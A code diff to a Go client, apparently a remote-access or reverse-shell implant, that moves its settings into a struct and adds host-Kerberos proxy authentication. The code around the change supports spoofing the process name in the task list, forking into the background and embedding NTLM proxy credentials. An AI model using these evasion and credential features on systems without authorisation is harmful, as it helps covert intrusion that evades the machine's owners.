@@ -41,10 +41,10 @@ var (
 	proxy       string
 	ignoreInput string
 	customSNI   string
-	useKerberos bool
 	// golang can only embed strings using the compile time linker
-	useKerberosStr string
-	logLevel       string
+	useHostKerberos string
+	logLevel        string
+
 	ntlmProxyCreds string
 )
 
@@ -55,6 +55,7 @@ func printHelp() {
 	fmt.Println("\t\t--fingerprint\tServer public key SHA256 hex fingerprint for auth")
 	fmt.Println("\t\t--proxy\tLocation of HTTP connect proxy to use")
 	fmt.Println("\t\t--ntlm-proxy-creds\tNTLM proxy credentials in format DOMAIN\\USER:PASS")
+	fmt.Println("\t\t--host-kerberos\tAttempt to use the host kerberos to authenticate with proxy")
 	fmt.Println("\t\t--process_name\tProcess name shown in tasklist/process list")
 	fmt.Println("\t\t--sni\tWhen using TLS set the clients requested SNI to this value")
 	fmt.Println("\t\t--log-level\tChange logging output levels, [INFO,WARNING,ERROR,FATAL,DISABLED]")
@@ -64,10 +65,21 @@ func printHelp() {
 }
 
 func main() {
-	useKerberos = useKerberosStr == "true"
+
+	settings := &client.Settings{
+		Fingerprint:          fingerprint,
+		ProxyAddr:            proxy,
+		Addr:                 destination,
+		ProxyUseHostKerberos: useHostKerberos == "true",
+		SNI:                  customSNI,
+	}
+
+	if err := settings.SetNTLMProxyCreds(ntlmProxyCreds); err != nil {
+		log.Fatalf("Embedded ntlm proxy credentials are invalid: %q: %v", ntlmProxyCreds, err)
+	}
 
 	if len(os.Args) == 0 || ignoreInput == "true" {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(settings)
 		return
 	}
 
@@ -92,17 +104,17 @@ func main() {
 
 	proxyaddress, _ := line.GetArgString("proxy")
 	if len(proxyaddress) > 0 {
-		proxy = proxyaddress
+		settings.ProxyAddr = proxyaddress
 	}
 
 	userSpecifiedFingerprint, err := line.GetArgString("fingerprint")
 	if err == nil {
-		fingerprint = userSpecifiedFingerprint
+		settings.Fingerprint = userSpecifiedFingerprint
 	}
 
 	userSpecifiedSNI, err := line.GetArgString("sni")
 	if err == nil {
-		customSNI = userSpecifiedSNI
+		settings.SNI = userSpecifiedSNI
 	}
 
 	userSpecifiedNTLMCreds, err := line.GetArgString("ntlm-proxy-creds")
@@ -111,18 +123,17 @@ func main() {
 			log.Fatal("You cannot use both the host kerberos credentials and static ntlm proxy credentials at once. --host-kerberos and --ntlm-proxy-creds")
 		}
 
-		ntlmProxyCreds = userSpecifiedNTLMCreds
-	} else if len(ntlmProxyCreds) > 0 {
-		client.SetNTLMProxyCreds(ntlmProxyCreds)
+		err = settings.SetNTLMProxyCreds(userSpecifiedNTLMCreds)
+		if err != nil {
+			log.Fatalf("invalid static ntlm credentials specified %q: %v", userSpecifiedNTLMCreds, err)
+		}
 	}
-
-	processArgv, _ := line.GetArgsString("process_name")
 
 	if line.IsSet("host-kerberos") {
-		useKerberos = true
+		settings.ProxyUseHostKerberos = true
 	}
 
-	if !(line.IsSet("d") || line.IsSet("destination")) && len(destination) == 0 && len(line.Arguments) < 1 {
+	if !(line.IsSet("d") || line.IsSet("destination")) && len(settings.Addr) == 0 && len(line.Arguments) < 1 {
 		fmt.Println("No destination specified")
 		printHelp()
 		return
@@ -165,20 +176,21 @@ func main() {
 	}
 
 	if fg || child {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(settings)
 		return
 	}
 
 	if strings.HasPrefix(destination, "stdio://") {
 		// We cant fork off of an inetd style connection or stdin/out will be closed
 		log.SetOutput(io.Discard)
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(settings)
 		return
 	}
 
-	err = Fork(destination, fingerprint, proxy, customSNI, useKerberos, processArgv...)
+	processArgv, _ := line.GetArgsString("process_name")
+	err = Fork(settings, processArgv...)
 	if err != nil {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos)
+		Run(settings)
 	}
 
 }
